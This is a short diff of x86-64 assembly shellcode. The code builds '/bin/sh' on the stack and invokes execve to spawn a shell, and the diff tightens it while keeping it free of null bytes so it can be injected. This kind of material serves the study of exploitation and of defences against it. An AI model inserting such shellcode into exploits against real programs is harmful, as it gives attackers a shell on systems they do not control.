@@ -9,13 +9,10 @@ one:
   xor   rax, rax      ; rax = 0
   push  rax           ; 8 null bytes on the stach
   push  rax           ; another 8 null bytes on the stack
-  mov   rax, [rbx]    ; 8 bytes of data in rax
-  push  rax           ; now on the stack
-  xor   rax, rax      ; rax = 0 (not about efficiency: avoid null bytes)
+  push  qword [rbx]   ; now 8 bytes of data on the stack
   mov   [rsp+7], al   ; Null terminate the string /bin/sh
   mov   [rsp+8], rsp  ; address of argv is rsp+8, argv[0] is rsp
 
-  xor   rax, rax      ; avoiding 'mov rax, 59' because of null bytes
   mov   al, 59        ; sys_execve 64 bits (see /usr/include/asm/unistd_64.h)
   mov   rdi, rsp      ; filename
   lea   rsi, [rsp+8]  ; address of argv ('mov rsi, rsp+8' not valid assembly)
